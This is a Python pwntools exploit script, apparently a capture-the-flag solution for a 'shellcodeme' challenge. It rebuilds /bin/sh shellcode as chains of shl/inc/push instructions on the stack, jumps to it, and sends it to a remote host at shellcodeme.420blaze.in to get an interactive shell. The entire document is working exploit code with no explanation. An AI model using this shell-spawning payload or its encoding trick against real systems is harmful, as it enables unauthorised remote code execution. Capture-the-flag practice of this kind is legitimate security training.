from pwn import *

context(os='linux', arch='amd64')

def makesh(val):
    base = 2 ** 63
    code = ''
    for i in range(64):
        code += 'shl rax, 1\n'
        if (val / base > 0):
            code += 'inc rax\n'
            val -= base
        base /= 2
    return code

shcode = asm(shellcraft.sh())
stack = ''
for i in range((len(shcode) + 7) / 8):
    sub8 = shcode[i * 8:(i + 1) * 8]
    for j in range(len(sub8), 8):
        sub8 += '\x00'
    stack = makesh(u64(sub8)) + 'push rax\n' + stack

stack += 'jmp rsp\n'

# r = process('./shellcodeme')
r = remote('shellcodeme.420blaze.in', 420)
r.sendlineafter('Shellcode?\n', asm(stack))
r.interactive()
